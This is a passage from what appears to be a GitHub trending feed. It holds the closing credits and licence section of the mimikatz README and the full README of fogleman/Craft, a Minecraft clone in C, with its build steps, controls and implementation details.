Integration&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;mimikatz&lt;/code&gt; project is available on AppVeyor - &lt;a href=&#34;https://ci.appveyor.com/project/gentilkiwi/mimikatz&#34;&gt;https://ci.appveyor.com/project/gentilkiwi/mimikatz&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Its status is: &lt;img src=&#34;https://ci.appveyor.com/api/projects/status/github/gentilkiwi/mimikatz?svg=true&amp;amp;retina=true&#34; alt=&#34;AppVeyor CI status&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Licence&lt;/h2&gt; &#xA;&lt;p&gt;CC BY 4.0 licence - &lt;a href=&#34;https://creativecommons.org/licenses/by/4.0/&#34;&gt;https://creativecommons.org/licenses/by/4.0/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;mimikatz&lt;/code&gt; needs coffee to be developed:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PayPal: &lt;a href=&#34;https://www.paypal.me/delpy/&#34;&gt;https://www.paypal.me/delpy/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Author&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Benjamin DELPY &lt;code&gt;gentilkiwi&lt;/code&gt;, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )&lt;/li&gt; &#xA; &lt;li&gt;DCSync and DCShadow functions in &lt;code&gt;lsadump&lt;/code&gt; module were co-writed with Vincent LE TOUX, you can contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( &lt;a href=&#34;http://www.mysmartlogon.com&#34;&gt;http://www.mysmartlogon.com&lt;/a&gt; )&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This is a &lt;strong&gt;personal&lt;/strong&gt; development, please respect its philosophy and don&#39;t use it for bad things!&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>fogleman/Craft</title>
    <updated>2022-11-20T01:40:18Z</updated>
    <id>tag:github.com,2022-11-20:/fogleman/Craft</id>
    <link href="https://github.com/fogleman/Craft" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A simple Minecraft clone written in C using modern OpenGL (shaders).&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Craft&lt;/h2&gt; &#xA;&lt;p&gt;Minecraft clone for Windows, Mac OS X and Linux. Just a few thousand lines of C using modern OpenGL (shaders). Online multiplayer support is included using a Python-based server.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.michaelfogleman.com/craft/&#34;&gt;http://www.michaelfogleman.com/craft/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/SH7wcas.png&#34; alt=&#34;Screenshot&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Features&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Simple but nice looking terrain generation using perlin / simplex noise.&lt;/li&gt; &#xA; &lt;li&gt;More than 10 types of blocks and more can be added easily.&lt;/li&gt; &#xA; &lt;li&gt;Supports plants (grass, flowers, trees, etc.) and transparency (glass).&lt;/li&gt; &#xA; &lt;li&gt;Simple clouds in the sky (they don&#39;t move).&lt;/li&gt; &#xA; &lt;li&gt;Day / night cycles and a textured sky dome.&lt;/li&gt; &#xA; &lt;li&gt;World changes persisted in a sqlite3 database.&lt;/li&gt; &#xA; &lt;li&gt;Multiplayer support!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Download&lt;/h3&gt; &#xA;&lt;p&gt;Mac and Windows binaries are available on the website.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.michaelfogleman.com/craft/&#34;&gt;http://www.michaelfogleman.com/craft/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;See below to run from source.&lt;/p&gt; &#xA;&lt;h3&gt;Install Dependencies&lt;/h3&gt; &#xA;&lt;h4&gt;Mac OS X&lt;/h4&gt; &#xA;&lt;p&gt;Download and install &lt;a href=&#34;http://www.cmake.org/cmake/resources/software.html&#34;&gt;CMake&lt;/a&gt; if you don&#39;t already have it. You may use &lt;a href=&#34;http://brew.sh&#34;&gt;Homebrew&lt;/a&gt; to simplify the installation:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;brew install cmake&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Linux (Ubuntu)&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo apt-get install cmake libglew-dev xorg-dev libcurl4-openssl-dev&#xA;sudo apt-get build-dep glfw&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Windows&lt;/h4&gt; &#xA;&lt;p&gt;Download and install &lt;a href=&#34;http://www.cmake.org/cmake/resources/software.html&#34;&gt;CMake&lt;/a&gt; and &lt;a href=&#34;http://www.mingw.org/&#34;&gt;MinGW&lt;/a&gt;. Add &lt;code&gt;C:\MinGW\bin&lt;/code&gt; to your &lt;code&gt;PATH&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Download and install &lt;a href=&#34;http://curl.haxx.se/download.html&#34;&gt;cURL&lt;/a&gt; so that CURL/lib and CURL/include are in your Program Files directory.&lt;/p&gt; &#xA;&lt;p&gt;Use the following commands in place of the ones described in the next section.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cmake -G &#34;MinGW Makefiles&#34;&#xA;mingw32-make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Compile and Run&lt;/h3&gt; &#xA;&lt;p&gt;Once you have the dependencies (see above), run the following commands in your terminal.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/fogleman/Craft.git&#xA;cd Craft&#xA;cmake .&#xA;make&#xA;./craft&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Multiplayer&lt;/h3&gt; &#xA;&lt;p&gt;After many years, craft.michaelfogleman.com has been taken down. See the &lt;a href=&#34;https://raw.githubusercontent.com/fogleman/Craft/master/#server&#34;&gt;Server&lt;/a&gt; section for info on self-hosting.&lt;/p&gt; &#xA;&lt;h4&gt;Client&lt;/h4&gt; &#xA;&lt;p&gt;You can connect to a server with command line arguments...&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./craft [HOST [PORT]]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Or, with the &#34;/online&#34; command in the game itself.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/online [HOST [PORT]]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Server&lt;/h4&gt; &#xA;&lt;p&gt;You can run your own server or connect to mine. The server is written in Python but requires a compiled DLL so it can perform the terrain generation just like the client.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gcc -std=c99 -O3 -fPIC -shared -o world -I src -I deps/noise deps/noise/noise.c src/world.c&#xA;python server.py [HOST [PORT]]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Controls&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;WASD to move forward, left, backward, right.&lt;/li&gt; &#xA; &lt;li&gt;Space to jump.&lt;/li&gt; &#xA; &lt;li&gt;Left Click to destroy a block.&lt;/li&gt; &#xA; &lt;li&gt;Right Click or Cmd + Left Click to create a block.&lt;/li&gt; &#xA; &lt;li&gt;Ctrl + Right Click to toggle a block as a light source.&lt;/li&gt; &#xA; &lt;li&gt;1-9 to select the block type to create.&lt;/li&gt; &#xA; &lt;li&gt;E to cycle through the block types.&lt;/li&gt; &#xA; &lt;li&gt;Tab to toggle between walking and flying.&lt;/li&gt; &#xA; &lt;li&gt;ZXCVBN to move in exact directions along the XYZ axes.&lt;/li&gt; &#xA; &lt;li&gt;Left shift to zoom.&lt;/li&gt; &#xA; &lt;li&gt;F to show the scene in orthographic mode.&lt;/li&gt; &#xA; &lt;li&gt;O to observe players in the main view.&lt;/li&gt; &#xA; &lt;li&gt;P to observe players in the picture-in-picture view.&lt;/li&gt; &#xA; &lt;li&gt;T to type text into chat.&lt;/li&gt; &#xA; &lt;li&gt;Forward slash (/) to enter a command.&lt;/li&gt; &#xA; &lt;li&gt;Backquote (`) to write text on any block (signs).&lt;/li&gt; &#xA; &lt;li&gt;Arrow keys emulate mouse movement.&lt;/li&gt; &#xA; &lt;li&gt;Enter emulates mouse click.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Chat Commands&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;/goto [NAME]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Teleport to another user. If NAME is unspecified, a random user is chosen.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/list&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Display a list of connected users.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/login NAME&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Switch to another registered username. The login server will be re-contacted. The username is case-sensitive.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/logout&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Unauthenticate and become a guest user. Automatic logins will not occur again until the /login command is re-issued.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/offline [FILE]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Switch to offline mode. FILE specifies the save file to use and defaults to &#34;craft&#34;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/online HOST [PORT]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Connect to the specified server.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/pq P Q&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Teleport to the specified chunk.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/spawn&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Teleport back to the spawn point.&lt;/p&gt; &#xA;&lt;h3&gt;Screenshot&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/foYz3aN.png&#34; alt=&#34;Screenshot&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Implementation Details&lt;/h3&gt; &#xA;&lt;h4&gt;Terrain Generation&lt;/h4&gt; &#xA;&lt;p&gt;The terrain is generated using Simplex noise - a deterministic noise function seeded based on position. So the world will always be generated the same way in a given location.&lt;/p&gt; &#xA;&lt;p&gt;The world is split up into 32x32 block chunks in the XZ plane (Y is up). This allows the world to be “infinite” (floating point precision is currently a problem at large X or Z values) and also makes it easier to manage the data. Only visible chunks need to be queried from the database.&lt;/p&gt; &#xA;&lt;h4&gt;Rendering&lt;/h4&gt; &#xA;&lt;p&gt;Only exposed faces are rendered. This is an important optimization as the vast majority of blocks are either completely hidden or are only exposing one or two faces. Each chunk records a one-block width overlap for each neighboring chunk so it knows which blocks along its perimeter are exposed.&lt;/p&gt; &#xA;&lt;p&gt;Only visible chunks are rendered. A naive frustum-culling approach is used to test if a chunk is in the camera’s view. If it is not, it is not rendered. This results in a pretty decent performance improvement as well.&lt;/p&gt; &#xA;&lt;p&gt;Chunk buffers are completely regenerated when a block is changed in that chunk, instead of trying to update the VBO.&lt;/p&gt; &#xA;&lt;p&gt;Text is rendered using a bitmap atlas. Each character is rendered onto two triangles forming a 2D rectangle.&lt;/p&gt; &#xA;&lt;p&gt;“Modern” OpenGL is used - no deprecated, fixed-function pipeline functions are used. Vertex buffer objects are used for position, normal and texture coordinates. Vertex and fragment shaders are used for rendering. Matrix manipulation functions are in matrix.c for translation, rotation, perspective, orthographic, etc. matrices. The 3D models are made up of very simple primitives - mostly cubes and rectangles. These models are generated in code in cube.c.&lt;/p&gt; &#xA;&lt;p&gt;Transparency in glass blocks and plants (plants don’t take up the full rectangular shape of their triangle primitives) is implemented by discarding magenta-colored pixels in the fragment shader.&lt;/p&gt; &#xA;&lt;h4&gt;Database&lt;/h4&gt; &#xA;&lt;p&gt;User changes to the world are stored in a sqlite database. Only the delta is stored, so the default world is generated and then the user changes are applied on top when loading.&lt;/p&gt; &#xA;&lt;p&gt;The main database table is named “block” and has columns p, q, x, y, z, w. (p, q) identifies the chunk, (x, y, z) identifies the block position and (w) identifies the block type. 0 represents an empty block (air).&lt;/p&gt; &#xA;&lt;p&gt;In game, the chunks store their blocks in a hash map. An (x, y, z) key maps to a (w) value.&lt;/p&gt; &#xA;&lt;p&gt;The y-position of blocks are limited to 0 &amp;lt;= y &amp;lt; 256. The upper limit is mainly an artificial limitation to prevent users from building unnecessarily tall structures. Users are not allowed to destroy blocks at y = 0 to avoid falling underneath the world.&lt;/p&gt; &#xA;&lt;h4&gt;Multiplayer&lt;/h4&gt; &#xA;&lt;p&gt;Multiplayer mode is implemented using plain-old sockets. A simple, ASCII, line-based protocol is used. Each line is made up of a command code and zero or more comma-separated arguments. The client requests chunks from the server with a simple command: C,p,q,key. “C” means “Chunk” and (p, q) identifies the chunk. The key is used for caching - the server will only send block updates that have been performed since the client last asked for that chunk. Block updates (in realtime or as part of a chunk request) are sent to the client in the format: B,p,q,x,y,z,w. After sending all of the blocks for a requested chunk, the server will send an updated cache key in the format: K,p,q,key. The client will store this key and use it the next time it needs to ask for that chunk. Player positions are sent in the format: P,pid,x,y,z,rx,ry. The pid is the player ID and the rx and ry values indicate the player’s rotation in two different axes. The client interpolates player positions from the past two position updates for smoother animation. The client sends its position to the server at most every 0.1 seconds (less if not moving).&lt;/p&gt; &#xA;&lt;p&gt;Client-side caching to the sqlite database can be performance intensive when connecting to a server for the first time. For this reason, sqlite writes are performed on a background thread. All writes occur in a transaction for performance. The transaction is committed every 5 seconds as opposed to some logical amount of work completed. A ring / circular buffer is used as a queue for what data is to be written to the database.&lt;/p&gt; &#xA;&lt;p&gt;In multiplayer mode, players can observe one another in the main view or in a picture-in-picture view. Implementation of the PnP was surprisingly simple - just change the viewport and render the scene again from the other player’s point of view.&lt;/p&gt; &#xA;&lt;h4&gt;Collision Testing&lt;/h4&gt; &#xA;&lt;p&gt;Hit testing (what block the user is pointing at) is implemented by scanning a ray from the player’s position outward, following their sight vector. This is not a precise method, so the step rate can be made smaller to be more accurate.&lt;/p&gt; &#xA;&lt;p&gt;Collision testing simply adjusts the player’s position to remain a certain distance away from any adjacent blocks that are obstacles. (Clouds and plants are not marked as obstacles, so you pass right through them.)&lt;/p&gt; &#xA;&lt;h4&gt;Sky Dome&lt;/h4&gt; &#xA;&lt;p&gt;A textured sky dome is used for the sky. The X-coordinate of the texture represents time of day. The Y-values map from the bottom of the sky sphere to the top of the sky sphere. The player is always in the center of the sphere. The fragment shaders for the blocks also sample the sky texture to determine the appropriate fog color to blend with based on the block’s position relative to the backing sky.&lt;/p&gt; &#xA;&lt;h4&gt;Ambient Occlusion&lt;/h4&gt; &#xA;&lt;p&gt;Ambient occlusion is implemented as described on this page:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://0fps.wordpress.com/2013/07/03/ambient-occlusion-for-minecraft-like-worlds/&#34;&gt;http://0fps.wordpress.com/2013/07/03/ambient-occlusion-for-minecraft-like-worlds/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Dependencies&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;GLEW is used for managing OpenGL extensions across platforms.&lt;/li&gt; &#xA; &lt;li&gt;GLFW is used for cross-platform window management.&lt;/li&gt; &#xA; &lt;li&gt;CURL is used for HTTPS / SSL POST for the authentication process.&lt;/li&gt; &#xA; &lt;li&gt;lodepng is used for loading PNG textures.&lt;/li&gt; &#xA; &lt;li&gt;sqlite3 is used for saving the blocks added / removed by the user.&lt;/li&gt; &#xA; &lt;li&gt;tinycthread is used for cross-platform threading.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>